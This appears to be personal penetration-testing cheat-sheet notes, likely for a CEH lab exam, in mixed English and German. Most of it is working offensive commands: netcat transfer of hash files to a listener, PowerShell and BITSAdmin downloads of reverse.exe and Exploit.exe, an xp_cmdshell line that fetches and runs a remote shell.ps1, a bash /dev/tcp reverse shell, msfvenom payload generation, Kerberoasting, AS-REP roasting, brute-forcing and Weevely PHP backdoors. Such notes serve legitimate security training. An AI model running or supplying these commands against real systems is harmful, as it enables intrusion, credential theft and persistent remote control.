# General Tips:

- Kali addons are in /usr/share/*
- Access network -> Zeile: smb://XX.XX.XX.XX
- Netcat Listen:   
    -     nc -lvp 9999 > hash.txt
- Netcat Write: 
    -     ncat.exe -w 3 10.10.1.13 9999 < hash.txt
- Convert text to UTF8 (make rockyou usable): 
    -     iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt > rockyou_utf8.txt

---
### Windows Terminal:
- Cat -> type
- Ls -> dir

---
### Nmap Flags:
- -O -> Osdetection
- -A -> Aggressive (script, os, version)
- -sV -> Version
- -sN -> Pingscan


---
### FileTransfers: UP->Down
Python Server

-     python3 -m http.server
-     wget http://192.168.1.35/FiletoTransfer
    - Windows:
    -     powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://172.25.0.10/reverse.exe','C:\reverse.exe')"
	-     wget http://172.25.0.10/reverse.exe -UseBasicParsing -OutFile reverse.exe 

Pure Netcat

-     nc 192.168.1.39 4444 -w 3 < FiletoTransfer
-     nc -lvp 4444 > FiletoTransfer

Impacket SMB Server

-     impacket-smbserver -smb2support test .
-     copy \\10.10.10.1:8080\FiletoTransfer FiletoTransfer



# Tools:

Recon: 
- Sitereport.netcraft.com -> subdomain finder



## Enum: 

### Windows

- Superenum -> nfs share enumeration?
- Global network inventory -> ???
- Nbtscan -> netbios
-     smbclient -L //IPADRESSE -U user --password=pw

---
#### Kerberoasting: 

    rubeus.exe kerberoast /outfile:hash.txt

#### AS-REP Roasting:    

- PORT 389 und 88 offen!
- GOTO: /root/impacket/examples
-     python3 GetNPUsers.py CEH.com/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip 10.10.1.22
-     john --wordlist=rockyou.txt hash.txt

---
### General

- Nslookup / dig soa XXX.com -> dns zone transfer
- docker run -d -p 443:443 --name openvas mikesplain/openvas
    - admin:password oder admin:admin
- webappscanner: wapitit / sn1per / wpscan
- dockerscanner: trivy image imagename
-     smtp-user-enum -U /path/to/usernames.txt -t <IP Address> -m 150 -M <mode>




---
## Exploit:

### Metasploit (msfconsole):

 - suche: search xxx
 - exploit nutzen: use xxx
 - flags listen: options
---
### SQL: 
- impacket xmp shell aktivieren
    -     python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30 -port 1433 (-windows-auth)
	      enable_xp_cmdshell
          xp_cmdshell "whoami"
	      EXEC xp_cmdshell 'echo IEX (New-Object Net.WebClient).DownloadString("http://172.25.0.10:8000/shell.ps1") | powershell -noprofile'
	      SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';
	
 - msfconsole mit mssql_payload
 - SQL MAP bei webpages
     -     Sqlmap -u "URL" --cokie="PHPSESSID=ASDF" {--dbs / -D "DBNAME" - T "TABLENAME" --dump / --os-shell}

### Cracking:

 - Hash Cracking
     -     hashcat -m 13100 --force -a 0 hash.txt /root/ADtools/rockyou.txt
	
 - RDP Bruteforce:
     -     crowbar -b rdp --server 192.168.10.144/32 -U username.txt -C password.txt 
	
 - WIFI Bruteforce:
     -     aircrack-ng -a2 -b [Target BSSID] -w wordlist.txt wpa2crack-01.cap
	
 - Other Bruteforce (help lists supported service):
     -     hydra -L users.txt -P rockyou.txt service://IP
---
### Session Hijack:

 - Caido -> Register to use windows tool
 - Hetty -> windows tool
 -     bettercap -iface eth0
     -     net.recon on, net.probe on, net.sniff on


---
## Persistence:

Weevely -> generate php backdoors and access them

Windows Reverse Shell: 
    
    msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=8888 -f exe > /root/ADtools/file.exe

Manual bash netcat shell: 

     bash -c "bash -i  >& /dev/tcp/IPADDRESSE/PORT 0>&1"
	 nc -lvnp port

https://www.revshells.com/



- Upgrade to normal shell:
    -     python3 -c 'import pty;pty.spawn("/bin/bash")'
    -     /usr/bin/script -qc /bin/bash /dev/null
    - vim:
        -     :set shell=/bin/sh
        -     :shell


---
## Prevention

Snort -> Windows IDS
cowrie -> Linux Honeypod (files on windows)

    sudo adduser --disabled-password cowrie
    start cowrie
    iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222

---
## Evasion: 

Filecopy via BITSAdmin (windows): 

    bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe

Sessionsplicing mit Whisker


---
## Buffer Overflow:

ImmunityDebugger.exe

Fuzz.py -> 10200

Metasploit/tools/exploit/Pattern_create.rb | 10400

Findoff.py -> insert pattern

Metasploit/tools/exploit/pattern_offset.rb -l 10400 -q OFFSETVALUE  --> 2003

Overwrite.py -> insert 2003

---
## Bonus
Super specific search git
[pentest-hacktricks/pentesting at master · ivanversluis/pentest-hacktricks · GitHub](https://github.com/ivanversluis/pentest-hacktricks/tree/master/pentesting)
